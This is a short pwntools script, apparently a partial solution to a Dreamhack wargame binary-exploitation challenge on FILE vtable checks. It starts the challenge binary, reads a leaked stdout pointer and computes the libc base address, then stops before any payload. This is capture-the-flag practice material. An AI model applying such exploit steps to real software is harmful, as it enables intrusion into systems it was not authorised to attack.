from pwn import *

context.terminal = ['tmux', 'new-window']

env = {"LD_PRELOAD": "/home/hibrian827/Wargame/Dreamhack/Pwnable/iofile_vtable_check/problem/libc.so.6"}
rem = process("./Pwnable/iofile_vtable_check/problem/iofile_vtable_check", env=env)

# gdb.attach(rem)

lib = ELF("./Pwnable/iofile_vtable_check/problem/libc.so.6")

rem.recvuntil(b"stdout: ")
temp = rem.recvn(14)
print(temp)
print(hex(int(temp, 16)))
lib_base = int(temp, 16) - lib.symbols['_IO_2_1_stdout_']

print(hex(lib_base))